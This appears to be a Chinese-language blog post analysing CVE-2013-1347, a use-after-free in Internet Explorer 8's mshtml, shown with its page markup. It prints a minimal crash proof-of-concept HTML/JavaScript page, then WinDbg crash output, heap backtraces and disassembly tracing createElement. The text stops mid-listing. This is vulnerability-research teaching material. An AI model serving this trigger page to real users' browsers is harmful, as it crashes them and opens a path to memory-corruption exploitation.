<!DOCTYPE html>












  


<html class="theme-next gemini use-motion" lang="en">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">


























<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">

<link rel="stylesheet" href="/css/main.css?v=6.7.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.7.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=6.7.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=6.7.0">


  <link rel="mask-icon" href="/images/logo.svg?v=6.7.0" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '6.7.0',
    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="从备份失败的老博客还原出来的">
<meta name="keywords" content="old_blog,browser,vuln">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2013-1347">
<meta property="og:url" content="https://vsane.github.io/2019/01/09/CVE-2013-1347/index.html">
<meta property="og:site_name" content="V4kst1z&#39;s Blog">
<meta property="og:description" content="从备份失败的老博客还原出来的">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://static.zybuluo.com/dane909/ga15fw57jtvgrtcqssudgo3g/2018-07-11_142334.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/qc34h8hxv0btlr8508pru85j/xxx.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/2l0volz3oyozjlprnkrwsee4/4239479238.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/a4b1ot509avnm1wg1jw6c3dw/4293089432123.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/jrebckmhnrj4bzpxgaf1op7p/32398244444444.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/0nkfu7fo26y0yzsjhmhs7mb1/QQ%E6%88%AA%E5%9B%BE20180712003955.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/o2tpwf4umn0q549whs7ustpu/42304982309480329llll.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/tcdd0sfbumapox9u7gi5l2oj/QQ%E6%88%AA%E5%9B%BE20180712133222.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/8s9n2fj1qqc6e05605fakzpw/QQ%E6%88%AA%E5%9B%BE20180712142633.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/wfluhdmjvhvansghj04yqvmv/QQ%E6%88%AA%E5%9B%BE20180712143816.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/uonmfny44d06qlb7glxz1xff/QQ%E6%88%AA%E5%9B%BE20180712194202.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/j8vjlg0ktfvi2u9nfyll195c/QQ%E6%88%AA%E5%9B%BE20180712202009.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/dgj3hjbaq6xdlkunvf7n9xr0/QQ%E6%88%AA%E5%9B%BE20180712203202.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/me65zvw7mxgwrewukv0kdoyr/QQ%E6%88%AA%E5%9B%BE20180712203237.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/u22qo0hq4wisyzspofw03cbe/QQ%E6%88%AA%E5%9B%BE20180713000129.png">
<meta property="og:image" content="http://static.zybuluo.com/dane909/ruycgayu8tqh7f6df9csl8gz/QQ%E6%88%AA%E5%9B%BE20180713001839.png">
<meta property="og:updated_time" content="2019-01-09T09:06:08.246Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2013-1347">
<meta name="twitter:description" content="从备份失败的老博客还原出来的">
<meta name="twitter:image" content="http://static.zybuluo.com/dane909/ga15fw57jtvgrtcqssudgo3g/2018-07-11_142334.png">



  <link rel="alternate" href="/atom.xml" title="V4kst1z's Blog" type="application/atom+xml">




  <link rel="canonical" href="https://vsane.github.io/2019/01/09/CVE-2013-1347/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>CVE-2013-1347 | V4kst1z's Blog</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">V4kst1z's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">

    
    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">

    
    
    
      
    

    

    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tag"></i> <br>Tags</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-about">

    
    
    
      
    

    

    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>

  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://vsane.github.io/2019/01/09/CVE-2013-1347/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="V4kst1z">
      <meta itemprop="description" content="Fighting">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="V4kst1z's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">CVE-2013-1347

              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-01-09 15:52:41 / Modified: 17:06:08" itemprop="dateCreated datePublished" datetime="2019-01-09T15:52:41+08:00">2019-01-09</time>
            

            
              

              
            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/01/09/CVE-2013-1347/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2019/01/09/CVE-2013-1347/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>从备份失败的老博客还原出来的<br><a id="more"></a></p>
<h2 id="poc-分析"><a href="#poc-分析" class="headerlink" title="poc 分析"></a>poc 分析</h2><p>复现时使用的 <code>poc</code> 是漏洞战争附带资料里的 <code>min_poc</code>，代码如下<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span> <span class="comment">&lt;!-- required --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ttttt:whatever</span> <span class="attr">id</span>=<span class="string">"myanim"</span>/&gt;</span><span class="comment">&lt;!-- required format --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    f0=<span class="built_in">document</span>.createElement(<span class="string">'span'</span>);</span></span><br><span class="line"><span class="javascript">	<span class="built_in">document</span>.body.appendChild(f0);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">	f1=<span class="built_in">document</span>.createElement(<span class="string">'span'</span>);</span></span><br><span class="line"><span class="javascript">	<span class="built_in">document</span>.body.appendChild(f1);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">	f2=<span class="built_in">document</span>.createElement(<span class="string">'span'</span>);</span></span><br><span class="line"><span class="javascript">	<span class="built_in">document</span>.body.appendChild(f2);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">	<span class="built_in">document</span>.body.contentEditable=<span class="string">"true"</span>;</span></span><br><span class="line"><span class="javascript">	f2.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'datalist'</span>)); <span class="comment">//has to be a data list</span></span></span><br><span class="line"><span class="javascript">	f1.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'table'</span>));    <span class="comment">//has to be a table</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">	<span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="javascript">	        f0.offsetParent=<span class="literal">null</span>;                       <span class="comment">//required</span></span></span><br><span class="line"><span class="javascript">	&#125;<span class="keyword">catch</span>(e)&#123;  &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">	f2.innerHTML=<span class="string">""</span>;                                    <span class="comment">//required</span></span></span><br><span class="line"><span class="javascript">	f0.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'hr'</span>));       <span class="comment">//required</span></span></span><br><span class="line"><span class="javascript">	f1.innerHTML=<span class="string">""</span>;                                    <span class="comment">//required</span></span></span><br><span class="line"><span class="undefined">	CollectGarbage();</span></span><br><span class="line"><span class="undefined"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>开启页堆和栈回溯<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gflags.exe /i iexplore.exe +hpa +ust</span><br></pre></td></tr></table></figure></p>
<p><code>windbg</code> 附加已经打开 <code>poc</code> 的 <code>ie8</code> 浏览器，发生崩溃<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; g</span><br><span class="line">ModLoad: 6c770000 6c822000   C:\Windows\System32\jscript.dll</span><br><span class="line">(a44.664): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=68a89100 ebx=06e38fb0 ecx=06e1dfc8 edx=00000000 esi=0473c8e8 edi=00000000</span><br><span class="line">eip=6870b68d esp=0473c8bc ebp=0473c8d4 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246</span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\System32\mshtml.dll - </span><br><span class="line">mshtml!Ordinal104+0x4b0ee:</span><br><span class="line">6870b68d 8b01            mov     eax,dword ptr [ecx]  ds:0023:06e1dfc8=????????</span><br></pre></td></tr></table></figure></p>
<p>查看 <code>ecx</code> 发现不可访问，并且 <code>ecx</code> 指向的地址之前已经被 <code>free</code>, 所以可以存在 <code>use after free</code> 漏洞。回溯可知 <code>mshtml!CGenericElement</code> 对象被释放。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; dd ecx L1</span><br><span class="line">06b04fc8  ????????</span><br><span class="line">0:005&gt; !heap -p -a ecx</span><br><span class="line">    address 06b04fc8 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 12a1000</span><br><span class="line">    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)</span><br><span class="line">                                    6592750:          6b04000             2000</span><br><span class="line">    6cba90b2 verifier!AVrfDebugPageHeapFree+0x000000c2</span><br><span class="line">    772365f4 ntdll!RtlDebugFreeHeap+0x0000002f</span><br><span class="line">    771fa0aa ntdll!RtlpFreeHeap+0x0000005d</span><br><span class="line">    771c65a6 ntdll!RtlFreeHeap+0x00000142</span><br><span class="line">    7601bbe4 kernel32!HeapFree+0x00000014</span><br><span class="line">    6865c83a mshtml!CGenericElement::`scalar deleting destructor&apos;+0x0000003d</span><br><span class="line">    68711daf mshtml!CBase::SubRelease+0x00000022</span><br><span class="line">    6870a6b5 mshtml!CElement::PrivateRelease+0x0000002a</span><br><span class="line">    68707894 mshtml!PlainRelease+0x00000025</span><br><span class="line">    68753862 mshtml!PlainTrackerRelease+0x00000014</span><br><span class="line">    6bf3a735 jscript!VAR::Clear+0x0000005f</span><br><span class="line">    6bf56e46 jscript!GcContext::Reclaim+0x000000b6</span><br><span class="line">    6bf543e9 jscript!GcContext::CollectCore+0x00000123</span><br><span class="line">    6bfb83f0 jscript!JsCollectGarbage+0x0000001d</span><br><span class="line">    6bf4758c jscript!NameTbl::InvokeInternal+0x00000141</span><br><span class="line">    6bf44f84 jscript!VAR::InvokeByDispID+0x0000017f</span><br><span class="line">    6bf4e4c7 jscript!CScriptRuntime::Run+0x00002b80</span><br><span class="line">    6bf45d7d jscript!ScrFncObj::CallWithFrameOnStack+0x000000ce</span><br><span class="line">    6bf45cdb jscript!ScrFncObj::Call+0x0000008d</span><br><span class="line">    6bf45ef1 jscript!CSession::Execute+0x0000015f</span><br><span class="line">    6bf4620a jscript!COleScript::ExecutePendingScripts+0x000001bd</span><br><span class="line">    6bf4c3b9 jscript!COleScript::ParseScriptTextCore+0x000002a4</span><br><span class="line">    6bf4c1d1 jscript!COleScript::ParseScriptText+0x00000030</span><br><span class="line">    686ef774 mshtml!CScriptCollection::ParseScriptText+0x00000218</span><br><span class="line">    686ef58c mshtml!CScriptElement::CommitCode+0x000003c2</span><br><span class="line">    686ef34f mshtml!CScriptElement::Execute+0x000000c6</span><br><span class="line">    686d2d52 mshtml!CHtmParse::Execute+0x0000004a</span><br><span class="line">    686cc36a mshtml!CHtmPost::Broadcast+0x0000000f</span><br><span class="line">    686cceba mshtml!CHtmPost::Exec+0x000005f7</span><br><span class="line">    686ce945 mshtml!CHtmPost::Run+0x00000015</span><br><span class="line">    686ce8a9 mshtml!PostManExecute+0x000001fb</span><br><span class="line">    686ce80e mshtml!PostManResume+0x000000f7</span><br></pre></td></tr></table></figure></p>
<p>下面来看下触发崩溃的指令的附近指令，很明显 <code>ecx</code> 是一个对象的地址，<code>mov     eax,dword ptr [ecx]</code> 后 <code>eax</code> 为虚表地址，之后取偏移 <code>0x70</code> 调用虚函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">005</span>&gt; u <span class="number">6870b</span>68d </span><br><span class="line">mshtml!CElement::Doc:</span><br><span class="line"><span class="number">6870b</span>68d <span class="number">8b</span>01            mov     eax,dword ptr [ecx]</span><br><span class="line"><span class="number">6870b</span>68f <span class="number">8b</span>5070          mov     edx,dword ptr [eax+<span class="number">70</span>h]</span><br><span class="line"><span class="number">6870b</span>692 ffd2            call    edx</span><br><span class="line"><span class="number">6870b</span>694 <span class="number">8b</span>400c          mov     eax,dword ptr [eax+<span class="number">0</span>Ch]</span><br><span class="line"><span class="number">6870b</span>697 c3              ret</span><br><span class="line"><span class="number">6870b</span>698 <span class="number">90</span>              nop</span><br><span class="line"><span class="number">6870b</span>699 <span class="number">90</span>              nop</span><br><span class="line"><span class="number">6870b</span>69a <span class="number">90</span>              nop</span><br></pre></td></tr></table></figure></p>
<h2 id="DOM树创建"><a href="#DOM树创建" class="headerlink" title="DOM树创建"></a>DOM树创建</h2><p>先看下 <code>poc</code> 中的第一条 <code>js</code> 语句<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f0=<span class="built_in">document</span>.createElement(<span class="string">'span'</span>);</span><br></pre></td></tr></table></figure></p>
<p>可以通过 <code>windbg</code> 的 <code>x</code> 命令查询与 <code>document.createElement</code> 相关的函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; x mshtml!*document*createElement*</span><br><span class="line">68665e8d mshtml!CDocument::createElement = &lt;no type information&gt;</span><br><span class="line">68716ec0 mshtml!s_methdescCDocumentcreateElement = &lt;no type information&gt;</span><br><span class="line">68665ee6 mshtml!CDocument::CreateElementHelper = &lt;no type information&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以猜测 <code>mshtml!CDocument::createElement</code> 和 <code>mshtml!CDocument::CreateElementHelper</code> 函数和 <code>document.createElement</code> 有关，实际上也是由 <code>mshtml!CDocument::createElement</code> 去调用 <code>mshtml!CDocument::CreateElementHelper</code> 完成的。使用 <code>windbg</code> 对 <code>CDocument::createElement</code> 函数下断点，单步调试分析其功能，通过调试可以发现 <code>CDocument::createElement</code> 函数中实际创建元素的函数是 <code>CDocument::CreateElementHelper</code> 之后会调用所创建元素虚表偏移处 <code>0xd8</code> 和 <code>0xe0</code> 处的函数，如在上面的调试中调用的是创建 <code>span</code> 元素后的虚表中的 <code>mshtml!CXDomainRequest::QueryInterface</code> 和 <code>mshtml!CDomPrototype::Release</code> 函数，之后调用 <code>CBase::SetErrorInfo</code> 函数。注释见下图<br><img src="http://static.zybuluo.com/dane909/ga15fw57jtvgrtcqssudgo3g/2018-07-11_142334.png" alt="2018-07-11_142334.png-75.8kB"><br>下面再来分析下 <code>mshtml!CDocument::CreateElementHelper</code> 函数。调试时遇到的一个问题是 <code>ida</code> 通过 <code>mshtml</code> 的 <code>pdb</code> 自动识别出来的变量和 <code>windbg</code> 的变量有区别，感觉 <code>ida</code> 错啦。对比如下<br><img src="http://static.zybuluo.com/dane909/qc34h8hxv0btlr8508pru85j/xxx.png" alt="xxx.png-58.3kB"></p>
<p><img src="http://static.zybuluo.com/dane909/2l0volz3oyozjlprnkrwsee4/4239479238.png" alt="4239479238.png-11.6kB"></p>
<p>后面分析的时候我是按照 <code>windbg</code> 的类型来分析的。实际上在调试过程中主要的指令如下:<br><img src="http://static.zybuluo.com/dane909/a4b1ot509avnm1wg1jw6c3dw/4293089432123.png" alt="4293089432123.png-15.3kB"><br>其实就是先调用 <code>CDocument::Markup(void)</code> 获得 <code>CMarkup</code> 对象，然后通过 <code>CMarkup::CreateElement()</code> 创建新的元素。调试信息如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; p</span><br><span class="line">eax=00000004 ebx=0456d58c ecx=05b80fc8 edx=00000018 esi=0456d060 edi=05b80fc8</span><br><span class="line">eip=68665f28 esp=0456d034 ebp=0456d048 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CDocument::CreateElementHelper+0x45:</span><br><span class="line">68665f28 e813770a00      call    mshtml!CDocument::Markup (6870d640)</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=0589ef30 ebx=0456d58c ecx=05b80fc8 edx=00000018 esi=0456d060 edi=05b80fc8</span><br><span class="line">eip=68665f2d esp=0456d034 ebp=0456d048 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CDocument::CreateElementHelper+0x4a:</span><br><span class="line">68665f2d 50              push    eax</span><br><span class="line">0:005&gt; ln poi(eax)</span><br><span class="line">(68701f30)   mshtml!CMarkup::`vftable&apos;   |  (68702028)   mshtml!CDoc::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CMarkup::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=0589ef30 ebx=0456d58c ecx=05b80fc8 edx=00000018 esi=0456d060 edi=05b80fc8</span><br><span class="line">eip=68665f2e esp=0456d030 ebp=0456d048 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CDocument::CreateElementHelper+0x4b:</span><br><span class="line">68665f2e 33c0            xor     eax,eax</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=0456d58c ecx=05b80fc8 edx=00000018 esi=0456d060 edi=05b80fc8</span><br><span class="line">eip=68665f30 esp=0456d030 ebp=0456d048 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CDocument::CreateElementHelper+0x4d:</span><br><span class="line">68665f30 e84bfeffff      call    mshtml!CMarkup::CreateElement (68665d80)</span><br><span class="line">0:005&gt; dd esp L1</span><br><span class="line">0456d030  0589ef30</span><br><span class="line">0:005&gt; ln poi(0589ef30) </span><br><span class="line">(68701f30)   mshtml!CMarkup::`vftable&apos;   |  (68702028)   mshtml!CDoc::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CMarkup::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=00000000 ebx=0456d58c ecx=0591bfd8 edx=68711db9 esi=0456d060 edi=05b80fc8</span><br><span class="line">eip=68665f35 esp=0456d040 ebp=0456d048 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CDocument::CreateElementHelper+0x52:</span><br><span class="line">68665f35 8bf0            mov     esi,eax</span><br></pre></td></tr></table></figure></p>
<p>继续动态调试 <code>CMarkup::CreateElement</code> 函数。发现实际上又调用了 <code>CreateElement</code> 函数去做处理。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">682</span>C5E1D                 push    <span class="number">1</span>               ; <span class="class"><span class="keyword">struct</span> <span class="title">CMarkup</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">682</span>C5E1F                 push    <span class="number">0</span>               ; <span class="class"><span class="keyword">struct</span> <span class="title">CDoc</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">682</span>C5E21                 push    ecx             ; <span class="class"><span class="keyword">struct</span> <span class="title">CElement</span> **</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">682</span>C5E22                 push    eax             ; <span class="class"><span class="keyword">struct</span> <span class="title">CHtmTag</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">682</span><span class="function">C5E23                 call    <span class="title">CreateElement</span><span class="params">(CHtmTag *,CElement * *,CDoc *,CMarkup *,<span class="keyword">int</span> *,ulong)</span></span></span><br></pre></td></tr></table></figure></p>
<p>继续跟踪 <code>CreateElement</code> 函数。下面是部分调试信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span 